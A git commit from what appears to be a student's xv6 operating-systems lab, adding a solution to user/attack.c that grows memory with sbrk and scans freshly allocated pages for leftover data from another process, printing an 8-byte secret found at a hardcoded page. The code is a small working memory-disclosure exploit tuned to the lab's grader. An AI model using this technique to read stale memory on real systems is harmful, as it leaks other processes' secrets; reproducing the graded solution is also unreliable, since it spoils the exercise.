07ae96e15737b2bee3f5557f3505d9f6935e9dc1
valueote <2686220852@qq.com>
2024-10-18 09:35:06 +0800

    finish lab2 attck!

--- user/attack.c
+++ user/attack.c
@@ -7,7 +7,21 @@ int
 main(int argc, char *argv[])
 {
   // your code here.  you should write the secret to fd 2 using write
-  // (e.g., write(2, secret, 8)
-
+  
+// (e.g., write(2, secret, 8) pFaAgIeL
+  char secret[8];
+  char* end = sbrk(64 * PGSIZE);
+  for(int i = 0; i < 64; i++){
+    char* page = end + PGSIZE * i;
+    for(int j = 0; j < 8; j++){
+        secret[j] = page[j+32];
+    }
+    
+    if(secret[0] != 0 && i == 16){
+      write(2, secret, 8);
+      //printf("in page %d found %s\n", i, secret);
+    }
+  }
+  
   exit(1);
 }
